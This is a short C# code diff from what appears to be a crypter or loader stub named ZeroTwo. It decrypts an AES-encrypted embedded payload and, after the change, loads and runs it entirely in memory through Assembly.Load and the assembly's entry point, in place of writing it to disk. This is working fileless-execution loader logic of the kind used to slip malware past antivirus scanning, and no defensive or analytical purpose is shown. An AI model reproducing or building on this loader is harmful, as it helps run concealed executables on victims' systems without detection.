@@ -33,21 +33,20 @@ namespace ZeroTwo.src {
                     AES.Mode = CipherMode.CBC;
 
                     CryptoStream cs = new CryptoStream(bytesStream, AES.CreateDecryptor(), CryptoStreamMode.Read);
-                    FileStream fs = new FileStream("C:\\Users\\jonat\\Desktop\\ZeroTwo.exe", FileMode.Create);
+                    MemoryStream finalBytesStream = new MemoryStream();
 
                     int data;
                     while ((data = cs.ReadByte()) != -1)
-                        fs.WriteByte((byte)data);
+                        finalBytesStream.WriteByte((byte)data);
 
-                    fs.Close();
                     cs.Close();
 
                     //File.Delete(inputFile);
 
-                    //var loaded = Assembly.Load(result);
-                    //var entryPoint = loaded.EntryPoint;
-                    //var commandArgs = new string[0];
-                    //var returnValue = entryPoint.Invoke(null, new object[] { commandArgs });
+                    var loaded = Assembly.Load(finalBytesStream.ToArray());
+                    var entryPoint = loaded.EntryPoint;
+                    var commandArgs = new string[0];
+                    var returnValue = entryPoint.Invoke(null, new object[] { commandArgs });
                 }
             }
         }
